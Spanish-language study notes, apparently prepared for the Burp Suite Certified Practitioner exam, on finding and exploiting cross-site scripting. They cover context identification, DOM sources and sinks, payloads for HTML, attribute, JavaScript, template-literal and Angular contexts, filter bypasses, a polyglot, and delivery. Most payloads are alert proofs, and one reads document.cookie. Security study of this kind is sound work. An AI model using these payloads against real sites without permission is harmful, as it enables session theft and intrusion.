![[Pasted image 20260810191157.png]]

### 🧭 Metodología: cómo saber en qué contexto estás

Antes de elegir un payload, hay que **confirmar el punto de reflexión y el contexto exacto**. Proceso:

**1. Encuentra el punto de reflexión**
Envía un string único y localizable (ej. `zzXSSzz123`, texto plano, sin tags aún) y búscalo en el código fuente de la respuesta.

**2. Identifica el contexto según dónde aparece**

| Dónde aparece tu string | Contexto | Ejemplo |
|---|---|---|
| Entre dos tags, como texto normal | **HTML body** | `<p>zzXSSzz123</p>` |
| Dentro de un atributo, entre comillas | **HTML attribute** | `<input value="zzXSSzz123">` |
| Dentro de un atributo, sin comillas | **HTML attribute (unquoted)** | `<input value=zzXSSzz123>` |
| Dentro de un `<script>`, como string JS | **JavaScript string** | `var x = "zzXSSzz123";` |
| Dentro de un `<script>`, fuera de string | **JavaScript code** | poco común, muy peligroso |
| En un `href`, `src`, `action`, etc. | **URL context** | `<a href="zzXSSzz123">` |
| Dentro de `<style>` o `style="..."` | **CSS context** | menos común pero existe |

**3. Prueba si puedes "romper" el contexto**
Envía caracteres especiales relevantes y mira si se reflejan tal cual o se codifican/escapan:
```
'"<>(){}
```
- Si ves `&lt;` `&gt;` `&quot;` en el fuente → **HTML-encodeado**, no puedes inyectar tags directamente. Busca otra vía (atributos que no encodean igual, bypasses).
- Si ves `<` `>` `"` `'` tal cual → **puedes** intentar cerrar el contexto.

**4. Según el contexto, qué necesitas para cerrar:**
- **HTML body** → no hace falta cerrar nada: `<script>alert(1)</script>` o `<img src=x onerror=alert(1)>`.
- **HTML attribute (con comillas)** → cerrar comilla + tag: `"><script>alert(1)</script>` o inyectar evento sin salir: `" onmouseover="alert(1)`.
- **HTML attribute (sin comillas)** → un espacio basta: ` onmouseover=alert(1)`.
- **JavaScript string** → cerrar la comilla del string (y opcionalmente `</script>`): `';alert(1)//` o `</script><script>alert(1)</script>`.
- **URL context (href/src)** → pseudo-protocolo: `javascript:alert(1)`.

**5. Si algo se bloquea, itera**
- ¿Bloquean `<script>`? → `<svg onload=alert(1)>` o `<img onerror=alert(1)>`.
- ¿Bloquean `()`? → `onerror=alert;throw 1` (sin paréntesis).
- ¿Bloquean comillas simples? → escápalas `\'`, usa comillas dobles, o HTML entities (`&apos;`).
- ¿Bloquean todo tag conocido? → tags/eventos poco comunes (`<xss id=x onfocus=alert(1)>`, `<details open ontoggle=alert(1)>`).
- ¿No sabes el contexto exacto? → lanza un **polyglot**, diseñado para disparar en varios contextos a la vez.

> 🎯 **Regla de oro**: nunca lances un payload complejo a ciegas. Primero confirma el contexto con un string simple, después confirma qué caracteres pasan sin filtrar, y solo entonces elige el payload de la rama correspondiente del mindmap.

---

### 🟣 DOM-based XSS

El XSS DOM ocurre cuando datos controlados por el atacante fluyen de una **Source** (entrada) a un **Sink** (función peligrosa) sin sanitización.

**Sources** (de dónde viene el dato controlado por el usuario):
- `document.URL` / `document.URLUnencoded`
- `document.baseURI`
- `location`
- `document.cookie`
- `document.referrer`
- `window.name`
- `history.pushState` / `history.replaceState`
- `localStorage` / `sessionStorage`
- `IndexedDB` / `Database`

**Sinks** (dónde el dato se ejecuta o interpreta de forma peligrosa):
- `document.write()`
- `window.location`
- `document.cookie`
- `eval()`
- `document.domain`
- `WebSocket()`
- `element.src`
- `postMessage()`
- `setRequestHeader()`
- `FileReader.readAsText()`
- `ExecuteSql()`
- `sessionStorage.setItem()`
- `document.evaluate()`
- `JSON.parse()`
- `element.setAttribute()`
- `RegExp()`

> 💡 **Metodología DOM**: identificar sources controlables por el atacante, rastrear el flujo de datos y ver si llegan a un sink sin filtrar.

---

### 🔴 HTML Context

Cuando el input se refleja dentro de HTML.

**¿Podemos crear nuevos elementos HTML?**

- Payloads básicos:
  - `<script>alert(1)</script>`
  - `<img src onerror=alert(1)>`
  - `"><script>alert(1)</script>`
  - `"><svg onload=alert(1)>`

- **¿Tag personalizado?**
  - `<xss id=x tabindex=1 onfocus=alert(1)></xss>`

- **`<svg>`** (útil cuando faltan tags, con eventos bloqueados — requiere interacción del usuario):
  - `<svg width="300" height="200"><a><animate attributeName="onclick" values="javascript:console.log(1)"></animate><text x="150" y="100" text-anchor="middle">Click me</text></a></svg>`
  - `<svg><animatetransform onbegin=alert(1) attributeName=transform>`

**¿Podemos usar el elemento actual para disparar JavaScript?** (inyección dentro de un atributo)
- `" autofocus onfocus=alert(1) x="`
- `href="javascript:alert(1)"`
- `accesskey='X'onclick='alert(1)'`

---

### 🟠 Template Literal

Cuando el input se refleja dentro de un *template literal* de JS (backticks):
- `${alert(1)}`

---

### 🟡 JavaScript Context

Cuando el input se refleja dentro de un bloque `<script>` existente.

**¿Podemos cerrar el script actual?**
- `</script><script>alert(1)</script>`

**Paréntesis bloqueados** (WAF/filtro bloquea `()`):
- `onerror=alert; throw 1`

**¿Necesitamos escapar un string?**
- `'-alert(1)-'`
- `';alert(1)//`
- Si las comillas simples están escapadas, escapar el escape:
  - `\';alert(1)//`
- Probar HTML Encoding:
  - `&apos;alert(1);//`

---

### 🌸 Polyglots

Payload universal que intenta cubrir varios contextos a la vez:

```
><'"<script>{{7*7}}${alert(1)}trevor
```

---

### 🔵 Angular — Client-Side Template Injection (CSTI)

Cuando la app usa Angular y el input se renderiza dentro de un `{{ }}`:

```
{{constructor.constructor('alert(document.cookie)')()}}
```

---

### 🟢 Delivery (entrega del payload)

Formas de alojar/ejecutar un payload externo, útiles cuando el XSS está limitado en caracteres o requiere una URL:

- **Requiere un evento** (ej. `onhashchange`):
```html
  <iframe src="PAYLOAD">
```

- **No requiere evento** (se ejecuta con solo navegar):
```html
  <script>location='URL'</script>
```

---

### ✅ Checklist BSCP

- [ ] Enviar marcador único y localizar el punto de reflexión
- [ ] Identificar el contexto (HTML body, atributo, JS string, URL, CSS)
- [ ] Probar caracteres especiales (`'"<>(){}`) — ¿se codifican?
- [ ] Elegir técnica de cierre según el contexto
- [ ] Revisar filtros adicionales: paréntesis, palabras clave (`script`, `on...`)
- [ ] Probar tags alternativos (`svg`, `img`, custom tags) si hay bloqueo
- [ ] Si hay WAF persistente: usar polyglots o bypasses de eventos
- [ ] Confirmar sink DOM si es XSS basado en DOM
- [ ] Preparar payload de entrega si hay restricción de longitud